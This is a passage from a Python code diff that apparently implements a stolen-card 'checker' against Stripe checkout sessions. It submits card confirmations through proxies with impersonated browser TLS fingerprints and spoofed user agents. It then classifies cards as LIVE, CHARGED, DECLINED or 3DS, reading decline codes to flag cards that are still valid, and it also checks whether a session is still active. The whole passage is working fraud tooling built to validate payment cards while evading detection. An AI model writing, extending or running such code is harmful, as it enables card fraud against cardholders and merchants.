+                headers = get_stripe_headers()
+                if session_ctx and session_ctx.get("user_agent"):
+                    headers["user-agent"] = session_ctx["user_agent"]
+                if session_ctx and session_ctx.get("cookies"):
+                    headers["cookie"] = session_ctx["cookies"]
+
+                r = await s.post(
+                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                    headers=headers,
+                    data=conf_body,
+                    proxy=proxy_url,
+                    timeout=25
+                )
+                conf = r.json()
+
+                print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
+
+                if "error" in conf:
+                    err = conf["error"]
+                    dc = err.get("decline_code", "")
+                    msg = err.get("message", "Failed")
+                    err_code = err.get("code", "")
+
+                    # Check if session is expired/inactive/canceled/already paid
+                    if err_code in ('checkout_not_active_session', 'payment_intent_unexpected_state', 'checkout_succeeded_session') or 'no longer active' in msg.lower() or 'status of canceled' in msg.lower() or 'already been processed' in msg.lower():
+                        result["status"] = "SESSION_EXPIRED"
+                    # Check if decline code indicates card is LIVE
+                    elif dc in LIVE_DECLINE_CODES:
+                        result["status"] = "LIVE"
+                    else:
+                        result["status"] = "DECLINED"
+                    if dc:
+                        result["response"] = f"[{dc}] [{msg}]"
+                    elif err_code:
+                        result["response"] = f"[{err_code}] [{msg}]"
+                    else:
+                        result["response"] = msg
+                    print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
+                else:
+                    pi = conf.get("payment_intent") or {}
+                    st = pi.get("status", "") or conf.get("status", "")
+                    if st == "succeeded":
+                        result["status"] = "CHARGED"
+                        result["response"] = "Payment Successful"
+                    elif st == "requires_action":
+                        # ━━━ Detailed next_action analysis ━━━
+                        next_action = pi.get("next_action") or {}
+                        na_type = next_action.get("type", "unknown")
+                        
+                        print(f"[DEBUG] ⚠️ requires_action detected!")
+                        print(f"[DEBUG] next_action.type: {na_type}")
+                        print(f"[DEBUG] next_action full: {str(next_action)[:500]}")
+                        
+                        if na_type == "use_stripe_sdk":
+                            sdk_data = next_action.get("use_stripe_sdk", {})
+                            sdk_type = sdk_data.get("type", "unknown")
+                            stripe_js = sdk_data.get("stripe_js") or {}
+                            print(f"[DEBUG] 3DS SDK type: {sdk_type}")
+                            
+                            if sdk_type == "intent_confirmation_challenge":
+                                site_key = ""
+                                if isinstance(stripe_js, dict):
+                                    site_key = stripe_js.get("site_key", "")
+                                print(f"[DEBUG] 🔒 hCaptcha challenge — site_key={site_key[:20] if site_key else 'N/A'}")
+                                result["status"] = "3DS"
+                                result["response"] = f"CAPTCHA [{sdk_type}]"
+                            else:
+                                result["status"] = "3DS"
+                                result["response"] = f"3DS Challenge [{sdk_type}]"
+                        elif na_type == "redirect_to_url":
+                            redirect_url = next_action.get("redirect_to_url", {}).get("url", "")
+                            print(f"[DEBUG] 3DS redirect URL: {redirect_url[:200]}")
+                            result["status"] = "3DS"
+                            result["response"] = f"3DS Redirect [{na_type}]"
+                        else:
+                            print(f"[DEBUG] 🔍 Unknown next_action type: {na_type}")
+                            result["status"] = "3DS"
+                            result["response"] = f"3DS [{na_type}]"
+                    elif st == "requires_payment_method":
+                        result["status"] = "DECLINED"
+                        result["response"] = "Card Declined"
+                    else:
+                        result["status"] = "UNKNOWN"
+                        result["response"] = st or "Unknown"
+
+                result["time"] = round(time.perf_counter() - start, 2)
+                print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+                return result
+
+        except Exception as e:
+            err_str = str(e)
+            print(f"[DEBUG] ❌ Error: {err_str[:50]}")
+            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
+                print(f"[DEBUG] Retrying in 1s...")
+                await asyncio.sleep(1)
+                continue
+            result["status"] = "ERROR"
+            result["response"] = err_str[:50]
+            result["time"] = round(time.perf_counter() - start, 2)
+            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+            return result
+
+    return result
+
+
+async def check_checkout_active(pk: str, cs: str) -> bool:
+    """Check if a checkout session is still active."""
+    try:
+        bp = get_random_browser_profile()
+        eid = generate_eid()
+        body = f"key={pk}&eid={eid}&browser_locale=en-US&redirect_type=url"
+        async with CurlSession(impersonate=bp['tls']) as s:
+            r = await s.post(
+                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
+                headers=get_stripe_headers(),
+                data=body,
+                timeout=5
+            )
+            data = r.json()
+            return "error" not in data
+    except Exception as e:
+        print(f"[DEBUG] check_checkout_active error: {str(e)[:40]}")
+        return False
